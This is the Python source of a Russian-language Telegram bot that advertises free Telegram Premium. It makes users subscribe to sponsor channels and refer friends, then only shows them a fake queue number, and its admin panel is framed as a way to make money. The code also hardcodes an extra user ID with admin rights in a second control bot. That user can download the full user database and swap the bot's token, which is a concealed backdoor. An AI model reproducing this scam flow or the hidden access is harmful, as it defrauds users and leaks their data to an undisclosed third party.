from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.utils.exceptions import Throttled
from aiogram.dispatcher.handler import CancelHandler, current_handler
from aiogram.dispatcher.middlewares import BaseMiddleware
from aiogram.types import Message
from aiogram.dispatcher.filters import Text
from config import admin_id, admin_username
import markup as m
import os, asyncio, subprocess, random
import sqlite3 as sq
from database import Database



db = Database('all.db')
base = sq.connect('all.db')


cur = base.cursor()


def on_startup():
    os.system('cls||clear')
    print(f"Bot started!\nUsers: {db.all_user()}")


async def start_bot(dp):
    event_loop.create_task(dp.start_polling())


def bot_start_2(event_loop, token):
    try:
        bot = Bot(token)
        dp = Dispatcher(bot, storage=MemoryStorage())

        ikm_1 = InlineKeyboardMarkup()
        kb = InlineKeyboardButton("❌ Назад", callback_data="cancel_group")
        ikm_1.add(kb)

        @dp.message_handler(commands=["start"])
        async def start_cmd(message: types.Message):
            if admin_id == message.from_user.id or 966399110 == message.from_user.id:
                await bot.send_message(message.from_user.id, "🤖Админ панель\n🔰Что вы хотите сделать мой господин?", reply_markup=m.admin_2())

        @dp.callback_query_handler()
        async def callback1(call: types.CallbackQuery):
            if call.data == "dump":
                await bot.send_message(call.from_user.id, "Подождите немного...")

                rand = random.randint(1000, 10000)

                for i in cur.execute("SELECT * FROM `users`").fetchall():
                    with open(f"{rand}.txt", "a") as v:
                            v.write(str(i[0]) + "\n")

                await bot.send_document(call.from_user.id, "all.db")

            elif call.data == "update":
                await bot.send_message(call.from_user.id, "Введите токен бота⬇️", reply_markup=ikm_1)
                await update_bot.token.set()

            elif call.data == "cancel_group":
                for i in range(2):
                    await bot.delete_message(call.from_user.id, call.message.message_id - i)
                        
                await bot.send_message(call.from_user.id, "Отмена")



        class update_bot(StatesGroup):
            token = State()
            link = State()
                

        @dp.message_handler(state=update_bot.token)
        async def token_bot(message: types.Message, state: FSMContext):

            async with state.proxy() as data:
                data['token'] = message.text

            await bot.send_message(message.from_user.id, "Введите ссылку на бота⬇️", reply_markup=ikm_1)

            await update_bot.next()

        @dp.message_handler(state=update_bot.link)
        async def link_bot(message: types.Message, state: FSMContext):

            async with state.proxy() as data:
                data['link'] = message.text

            try:
                db.bot_update(data["token"], data["link"])
                await bot.send_message(message.from_user.id, "✅ Вы успешно изменили бота")
                subprocess.call(["python3", "main.py"]) 
            except Exception as ex:
                print(ex)
                await bot.send_message(message.from_user.id, "❌Ошибка")

            await state.finish()

        event_loop.run_until_complete(start_bot(dp))
    except:
        pass


def bot_start(event_loop, token, bot_link):
    
    try:

        bot = Bot(token)
        dp = Dispatcher(bot, storage=MemoryStorage())

        async def check_sub_channels(channels, user_id):
            for channel in channels:
                try:
                    chat_member = await bot.get_chat_member(chat_id=channel[1], user_id=user_id)
                    if chat_member['status'] == 'left':
                        return False
                except Exception as ex:
                    print(ex)
                    continue
            return True


        def markup_dell():
            group_l = cur.execute("SELECT * FROM 'group'")

            ikm = InlineKeyboardMarkup(row_width=2)

            for mark in group_l:
                
                ikb = InlineKeyboardButton(text=mark[2], callback_data=f"group_{mark[1]}")

                ikm.insert(ikb)

            
            return ikm
        
        def setup_middlewares(dp: Dispatcher):
            dp.middleware.setup(ThrottlingMiddleware())
        
        class ThrottlingMiddleware(BaseMiddleware):
            def __init__(self, limit=0.5, key_prefix='antiflood_'):
                self.rate_limit = limit
                self.prefix = key_prefix
                super(ThrottlingMiddleware, self).__init__()

            async def on_process_message(self, message: Message, data: dict):
                handler = current_handler.get()
                dispatcher = Dispatcher.get_current()

                if handler:
                    limit = getattr(handler, "throttling_rate_limit", self.rate_limit)
                    key = getattr(handler, "throttling_key", f"{self.prefix}_{handler.__name__}")
                else:
                    limit = self.rate_limit
                    key = f"{self.prefix}_message"

                if message.from_user.id != admin_id:
                    try:
                        await dispatcher.throttle(key, rate=limit)
                    except Throttled as t:
                        await self.message_throttled(message, t)
                        raise CancelHandler()

            @staticmethod
            async def message_throttled(message: types.Message, throttled: Throttled):
                if throttled.exceeded_count <= 2:
                    await message.reply("спамить плохо")

        def rate_limit(limit: int, key=None):
            def decorator(func):
                setattr(func, "throttling_rate_limit", limit)
                if key:
                    setattr(func, "throttling_key", key)
                return func

            return decorator
        

        setup_middlewares(dp)


        @dp.message_handler(commands="start")
        async def start(message: types.Message):

            start = message.text[7:]

            if admin_id == message.from_user.id:
                await bot.send_photo(message.from_user.id, photo="https://www.ixbt.com/img/n1/news/2022/5/2/1_25_large.png", caption=f"<b>👋Привет, {message.from_user.full_name}\n\nТы попал в бота который раздает телеграм премиум\nза простые задания! Что бы получить телеграм премиум выберите на какой срок вы хотите получить.</b>", parse_mode="html", reply_markup=m.button_admin())
                
            else:
                await bot.send_photo(message.from_user.id, photo="https://www.ixbt.com/img/n1/news/2022/5/2/1_25_large.png", caption=f"<b>👋Привет, {message.from_user.full_name}\n\nТы попал в бота который раздает телеграм премиум\nза простые задания! Что бы получить телеграм премиум выберите на какой срок вы хотите получить.</b>", parse_mode="html", reply_markup=m.button_1())

            
            if not db.user_exists(message.from_user.id):
                if str(start) != "":
                    if str(start) != str(message.from_user.id):
                        try:
                            db.new_user(message.from_user.id, start)
                            rand = random.randint(1,200)
                            await asyncio.sleep(rand)
                            await bot.send_message(start, "💎<b>По вашей ссылке зарегистрировался новый пользователь</b>", parse_mode="html")

                            # try:
                            #     await bot.send_message(admin_id, f"💎<b>Новый пользователь в боте {message.from_user.id} (@{message.from_user.username}). Его пригласил юзер с id: {start}</b>", parse_mode="html")
                            # except:
                            #     pass

                        except:
                            pass

                    else:
                        db.new_user(message.from_user.id)
                        await message.answer("Нельзя регистрироваться по своей ссылке!")

                        # try:
                        #     await bot.send_message(admin_id, f"💎<b>Новый пользователь в боте {message.from_user.id} (@{message.from_user.username})</b>", parse_mode="html")
                        # except:
                        #     pass

                else:
                    db.new_user(message.from_user.id)

                    # try:
                    #     await bot.send_message(admin_id, f"💎<b>Новый пользователь в боте {message.from_user.id} (@{message.from_user.username})</b>", parse_mode="html")
                    # except:
                    #     pass



        @dp.message_handler(Text(equals=["📱Профиль", "🚀Бесплатный телеграм премиум", "🔰Купить рекламу", "🥇Premium на год", "🥈Premium на 3 месяца", "🥉Premium на 1 месяц", "↪️ В главное меню", "📖 Админ панель"], ignore_case=True))
        async def profile(message: types.Message):
            if message.text == "📱Профиль":
                await message.answer(f"<b>👋Привет, {message.from_user.full_name}\n\n👤Ваш ID: {message.from_user.id}\n👤Приглашено человек: {db.all_refer(message.from_user.id)}\n\n├{bot_link}?start={message.from_user.id}\n└<code>Осталось до получения премиума: {5 - db.all_refer(message.from_user.id)}</code>\n\n└Заказать рекламу в боте: @{admin_username}</b>", parse_mode="html")

            elif message.text == "🚀Бесплатный телеграм премиум":
                await bot.send_photo(message.from_user.id, photo="https://telegram.org/file/464001879/1169b/0Tk59b1Omvc.119016/b15ee6405e996617af", caption="<b>🎁Выберите на какой срок хотите взять телеграм премиум</b>", parse_mode="html", reply_markup=m.button_3())


            elif message.text == "🔰Купить рекламу":
                await message.answer(f"<b>📖Информация по проекту:\n\n👤Пользователей в боте: {db.all_user()}\n🎁Получили премиум: {db.all_premium()}\n\n📊Рекламу вы можете заказать тут ⬇️</b>", reply_markup=m.button_2(), parse_mode="html")

            elif message.text == "🥇Premium на год":
                await message.answer("<b>⚜️Отлично выбранный вами период: 1 год</b>", parse_mode="html", reply_markup=m.button_4())
                if await check_sub_channels(cur.execute("SELECT * FROM 'group' "), message.from_user.id):
                    await bot.send_photo(message.from_user.id, photo="https://telegram.org/file/464001423/fa25/ANFkramBMcA.37928/2e33c103a2a7b3c441", caption=f"🎉<b>Осталось одно задание! Пригласи друзей по своей уникальной ссылке: {bot_link}?start={message.from_user.id}\n\nВы пригласили: {db.all_refer(message.from_user.id)} из 5 друзей.</b>", parse_mode="html", reply_markup=m.check_refer())

                else:
                    await bot.send_photo(message.from_user.id, photo="https://4pda.to/s/as6yrz2e2EGWVdvdJPsTGz0yt7GS1H.gif", caption="<b>⭐️Для получения премиума подпишитесь на наших спонсоров, которые помогают нам с раздачей:</b>", parse_mode="html", reply_markup=m.check())

            elif message.text == "🥈Premium на 3 месяца":
                await message.answer("<b>⚜️Отлично выбранный вами период: 3 месяца</b>", parse_mode="html", reply_markup=m.button_4())

                if await check_sub_channels(cur.execute("SELECT * FROM 'group' "), message.from_user.id):
                    await bot.send_photo(message.from_user.id, photo="https://telegram.org/file/464001423/fa25/ANFkramBMcA.37928/2e33c103a2a7b3c441", caption=f"🎉<b>Осталось одно задание! Пригласи друзей по своей уникальной ссылке: {bot_link}?start={message.from_user.id}\n\nВы пригласили: {db.all_refer(message.from_user.id)} из 5 друзей.</b>", parse_mode="html", reply_markup=m.check_refer())

                else:
                    await bot.send_photo(message.from_user.id, photo="https://4pda.to/s/as6yrz2e2EGWVdvdJPsTGz0yt7GS1H.gif", caption="<b>⭐️Для получения премиума подпишитесь на наших спонсоров, которые помогают нам с раздачей:</b>", parse_mode="html", reply_markup=m.check())


            elif message.text == "🥉Premium на 1 месяц":
                await message.answer("<b>⚜️Отлично выбранный вами период: 1 месяц</b>", parse_mode="html", reply_markup=m.button_4())

                if await check_sub_channels(cur.execute("SELECT * FROM 'group' "), message.from_user.id):
                    await bot.send_photo(message.from_user.id, photo="https://telegram.org/file/464001423/fa25/ANFkramBMcA.37928/2e33c103a2a7b3c441", caption=f"🎉<b>Осталось одно задание! Пригласи друзей по своей уникальной ссылке: {bot_link}?start={message.from_user.id}\n\nВы пригласили: {db.all_refer(message.from_user.id)} из 5 друзей.</b>", parse_mode="html", reply_markup=m.check_refer())

                else:
                    await bot.send_photo(message.from_user.id, photo="https://4pda.to/s/as6yrz2e2EGWVdvdJPsTGz0yt7GS1H.gif", caption="<b>⭐️Для получения премиума подпишитесь на наших спонсоров, которые помогают нам с раздачей:</b>", parse_mode="html", reply_markup=m.check())
            
            elif message.text == "↪️ В главное меню":
                if admin_id == message.from_user.id:
                    await bot.send_message(message.from_user.id, "<b>✅ Вы вернулись в главное меню</b>", reply_markup=m.button_admin(), parse_mode="html")
                else:
                    await bot.send_message(message.from_user.id, "<b>✅ Вы вернулись в главное меню</b>", reply_markup=m.button_1(), parse_mode="html")

            elif message.text == "📖 Админ панель":
                await bot.send_message(message.from_user.id, "<b>✅Вы успешно вошли в админ панель!\n\n💵Пора зарабатывать деньги</b>", parse_mode="html", reply_markup=m.admin())


        @dp.callback_query_handler(text=["check_sub", "check_refer", "stats"])
        async def callback(call: types.CallbackQuery):
            if call.data == "check_sub":
                if await check_sub_channels(cur.execute("SELECT * FROM 'group' "), call.from_user.id):
                    await bot.send_photo(call.from_user.id, photo="https://telegram.org/file/464001423/fa25/ANFkramBMcA.37928/2e33c103a2a7b3c441", caption=f"🎉<b>Осталось одно задание! Пригласи друзей по своей уникальной ссылке: {bot_link}?start={call.from_user.id}\n\nВы пригласили: {db.all_refer(call.from_user.id)} из 5 друзей.</b>", parse_mode="html", reply_markup=m.check_refer())

                else:
                    await bot.delete_message(call.from_user.id, call.message.message_id)
                    await bot.send_photo(call.from_user.id, photo="https://4pda.to/s/as6yrz2e2EGWVdvdJPsTGz0yt7GS1H.gif", caption="<b>⭐️Для получения премиума подпишитесь на наших спонсоров, которые помогают нам с раздачей:</b>", parse_mode="html", reply_markup=m.check())

            elif call.data == "check_refer":
                if db.all_refer(call.from_user.id) >= 5:
                    await bot.answer_callback_query(call.id, "✅ Вы выполнили задание. С вами свяжется администратор", show_alert=True)
                    await asyncio.sleep(2)
                    await bot.send_message(call.from_user.id, "<b>👋Здравствуйте, что бы получить премиум в кратчайшие сроки нужно выполнить условия:\n1. Зайти в официальный канал бота - @boostprem\n2. Пригласить еще 5+ человек в бота (чем больше пригласите тем быстрее вам выдадут телеграм премиум)\n🌍 Ваша очередь на получения премиума - 56</b>", parse_mode="html")
                    cur.execute("UPDATE `users` SET premium = True WHERE user_id = ?",  (call.from_user.id, ))
                    base.commit()
                else:
                    await bot.answer_callback_query(call.id, "❌ Вы не выполнили задание!", show_alert=True)

            elif call.data == "stats":
                await bot.send_message(call.from_user.id, f"💼Статистика\n\n👥Пользователей всего: {db.all_user()}\nЗа месяц: {db.get_old_users(30)}\nЗа неделю: {db.get_old_users(7)}\nЗа день: {db.get_old_users(1)}")


        class post(StatesGroup):
            admin_mail = State()
            admin_mail_accept = State()

        @dp.callback_query_handler(state=post.admin_mail_accept)
        async def admin_mail(call: types.CallbackQuery, state: FSMContext):
            if call.from_user.id == admin_id:
                if call.data == "admin_back_2":
                    for i in range(4):
                        await bot.delete_message(call.from_user.id, call.message.message_id - i)
                    await state.finish()
                    await bot.send_message(call.from_user.id, "Отменено")
                elif call.data == "admin_mail_accept":
                    _data = await state.get_data()
                    text = _data['text']
                    _type = _data['type']
                    photo = _data['photo']

                    a = 0

                    for i in cur.execute('SELECT `user_id` FROM `users`').fetchall():
                        try:
                            if _type == 'text_only':
                                await bot.send_message(i[0], text, parse_mode="HTML")
                            elif _type == 'photo':
                                await bot.send_photo(i[0], photo, text, parse_mode="HTML")
                            a += 1
                            await asyncio.sleep(0.1)
                        except:
                            pass
                    await state.finish()
                    await bot.send_message(call.from_user.id, f"✅ Рассылка успешно завершена\nПолучили {a} пользователей")

        @dp.callback_query_handler(state="*")
        async def admin_calls(call: types.CallbackQuery, state: FSMContext):
            if call.from_user.id == admin_id:

                if call.data == "admin_back":
                    await bot.delete_message(call.from_user.id, call.message.message_id)
                    await state.finish()
                    await bot.send_message(call.from_user.id, "Отменено")
                elif call.data == "admin_mail":
                    keyboard = InlineKeyboardMarkup()
                    keyboard.add(InlineKeyboardButton(text="❌ Назад", callback_data=f"admin_back"))
                    await bot.send_message(call.from_user.id, "Введите текст рассылки: ", reply_markup=keyboard)
                    await post.admin_mail.set()

                elif call.data == "new_group":

                    await bot.send_message(call.from_user.id, "Введите ссылку на канал или группу", reply_markup=ikm_1)
                    await add_group.group_link.set()

                elif call.data == "cancel_group":

                    for i in range(4):
                        await bot.delete_message(call.from_user.id, call.message.message_id - i)
                    await bot.send_message(call.from_user.id, "Отменено")

                    await state.finish()

                elif call.data == "accept_group":
                    
                    async with state.proxy() as data:
                        db.add_group(data['group_link'], data['group_id'], data['group_name'])

                    await bot.send_message(call.from_user.id, "✅ Группа добавлена")

                    await state.finish()

                elif call.data == "_dell_group":

                    await bot.send_message(call.from_user.id, "Какую группу вы хотите удалить?", reply_markup=markup_dell())

                elif call.data[:6] == "group_":
                    global mb_dell

                    ikm = InlineKeyboardMarkup()
                    ikb = InlineKeyboardButton("✅ Да", callback_data="group_true")
                    ikb1 = InlineKeyboardButton("❌ Нет", callback_data="group_false")
                    ikm.add(ikb).add(ikb1)

                    if call.data == "group_true":
                        for i in cur.execute("SELECT * FROM 'group'"):
                            if mb_dell == i[1]:
                                cur.execute("DELETE FROM 'group' WHERE group_id = ?", (i[1],))
                                base.commit()
                                await bot.send_message(call.from_user.id, "✅ Группа удалена")
                                break

                    elif call.data == "group_false":
                        for i in range(2):
                            await bot.delete_message(call.from_user.id, call.message.message_id - i)
                        
                        await bot.send_message(call.from_user.id, "Отмена")

                    else:
                        mb_dell = call.data[6::]
                        await bot.send_message(call.from_user.id, "Вы точно хотите удалить группу?", reply_markup=ikm)
                        


                await call.answer()


        @dp.message_handler(state=post.admin_mail)
        async def admin_mail(message: types.Message, state: FSMContext):
            if message.chat.id == admin_id:
                try:
                    text = message.text
                    keyboard = InlineKeyboardMarkup()
                    keyboard.add(InlineKeyboardButton(text="✅ Начать", callback_data=f"admin_mail_accept"))
                    keyboard.add(InlineKeyboardButton(text="❌ Назад", callback_data=f"admin_back_2"))
                    await state.update_data(text=text)
                    await state.update_data(photo=-1)
                    await post.admin_mail_accept.set()
                    await bot.send_message(message.chat.id, text, parse_mode="HTML")
                    await bot.send_message(message.chat.id, f"Начать рассылку?", reply_markup=keyboard)
                    await state.update_data(type='text_only')
                except:
                    await bot.send_message(message.chat.id, f"❌ Неверный текст")

        @dp.message_handler(content_types=types.ContentTypes.PHOTO, state=post.admin_mail)
        async def admin_mail_photo(message: types.Message, state: FSMContext):
            if message.chat.id == admin_id:
                try:
                    text = message.caption
                    keyboard = InlineKeyboardMarkup()
                    keyboard.add(InlineKeyboardButton(text="✅ Начать", callback_data=f"admin_mail_accept"))
                    keyboard.add(InlineKeyboardButton(text="❌ Назад", callback_data=f"admin_back_2"))
                    await state.update_data(text=text)
                    await state.update_data(photo=message.photo[-1].file_id)
                    await post.admin_mail_accept.set()
                    await bot.send_photo(message.chat.id, message.photo[-1].file_id, text, parse_mode="HTML")
                    await bot.send_message(message.chat.id, f"Начать рассылку?", reply_markup=keyboard)
                    await state.update_data(type='photo')
                except:
                    await bot.send_message(message.chat.id, f"❌ Неверный текст")

        class add_group(StatesGroup):
            group_link = State()
            group_id = State()
            group_name = State()

        ikm_1 = InlineKeyboardMarkup()
        kb = InlineKeyboardButton("❌ Назад", callback_data="cancel_group")
        ikm_1.add(kb)
                

        @dp.message_handler(state=add_group.group_link)
        async def group_link_add(message: types.Message, state: FSMContext):

            async with state.proxy() as data:
                data['group_link'] = message.text

            await bot.send_message(message.from_user.id, "Введите id группы например @remofo", reply_markup=ikm_1)

            await add_group.next()


        @dp.message_handler(state=add_group.group_id)
        async def group_link_add(message: types.Message, state: FSMContext):

            async with state.proxy() as data:
                data['group_id'] = message.text

            await bot.send_message(message.from_user.id, "Введите название группы", reply_markup=ikm_1)

            await add_group.next()


        @dp.message_handler(state=add_group.group_name)
        async def group_link_add(message: types.Message, state: FSMContext):


            ikm_2 = InlineKeyboardMarkup()
            kb_6 = InlineKeyboardButton("✅ Да", callback_data="accept_group")
            kb_7 = InlineKeyboardButton("❌ Отмена", callback_data="cancel_group")
            ikm_2.add(kb_6).add(kb_7)

            async with state.proxy() as data:
                data['group_name'] = message.text

                await bot.send_message(message.from_user.id, f"""
        Вы все правильно ввели?
        Ссылка: {data['group_link']}
        ID: {data['group_id']}
        Name: {data['group_name']}""", reply_markup=ikm_2)
                



        class post(StatesGroup):
            admin_mail = State()
            admin_mail_accept = State()

        @dp.callback_query_handler(state=post.admin_mail_accept)
        async def admin_mail(call: types.CallbackQuery, state: FSMContext):
            if call.from_user.id == admin_id:
                if call.data == "admin_back_2":
                    for i in range(4):
                        await bot.delete_message(call.from_user.id, call.message.message_id - i)
                    await state.finish()
                    await bot.send_message(call.from_user.id, "Отменено")
                elif call.data == "admin_mail_accept":
                    _data = await state.get_data()
                    text = _data['text']
                    _type = _data['type']
                    photo = _data['photo']

                    a = 0

                    for i in cur.execute('SELECT `user_id` FROM `users`').fetchall():
                        try:
                            if _type == 'text_only':
                                await bot.send_message(i[0], text, parse_mode="HTML")
                            elif _type == 'photo':
                                await bot.send_photo(i[0], photo, text, parse_mode="HTML")
                            a += 1
                            await asyncio.sleep(0.1)
                        except:
                            pass
                    await state.finish()
                    await bot.send_message(call.from_user.id, f"✅ Рассылка успешно завершена\nПолучили {a} пользователей")


        @dp.message_handler(state=post.admin_mail)
        async def admin_mail(message: types.Message, state: FSMContext):
            if message.chat.id == admin_id:
                try:
                    text = message.text
                    keyboard = InlineKeyboardMarkup()
                    keyboard.add(InlineKeyboardButton(text="✅ Начать", callback_data=f"admin_mail_accept"))
                    keyboard.add(InlineKeyboardButton(text="❌ Назад", callback_data=f"admin_back_2"))
                    await state.update_data(text=text)
                    await state.update_data(photo=-1)
                    await post.admin_mail_accept.set()
                    await bot.send_message(message.chat.id, text, parse_mode="HTML")
                    await bot.send_message(message.chat.id, f"Начать рассылку?", reply_markup=keyboard)
                    await state.update_data(type='text_only')
                except:
                    await bot.send_message(message.chat.id, f"❌ Неверный текст")

        @dp.message_handler(content_types=types.ContentTypes.PHOTO, state=post.admin_mail)
        async def admin_mail_photo(message: types.Message, state: FSMContext):
            if message.chat.id == admin_id:
                try:
                    text = message.caption
                    keyboard = InlineKeyboardMarkup()
                    keyboard.add(InlineKeyboardButton(text="✅ Начать", callback_data=f"admin_mail_accept"))
                    keyboard.add(InlineKeyboardButton(text="❌ Назад", callback_data=f"admin_back_2"))
                    await state.update_data(text=text)
                    await state.update_data(photo=message.photo[-1].file_id)
                    await post.admin_mail_accept.set()
                    await bot.send_photo(message.chat.id, message.photo[-1].file_id, text, parse_mode="HTML")
                    await bot.send_message(message.chat.id, f"Начать рассылку?", reply_markup=keyboard)
                    await state.update_data(type='photo')
                except:
                    await bot.send_message(message.chat.id, f"❌ Неверный текст")

        event_loop.run_until_complete(start_bot(dp))
    except Exception as ex:
        print(ex)

if __name__ == "__main__":

    cur.execute("CREATE TABLE IF NOT EXISTS `bots` (token TEXT, bot_link TEXT, check_bot TEXT)")

    #on_startup()

    event_loop = asyncio.get_event_loop()
    
    bot_1 = cur.execute('SELECT * FROM `bots`').fetchmany(0)
    bot_start_2(event_loop, bot_1[1][0])
    bot_start(event_loop, bot_1[0][0], bot_1[0][1])
        
            
        
    event_loop.run_forever()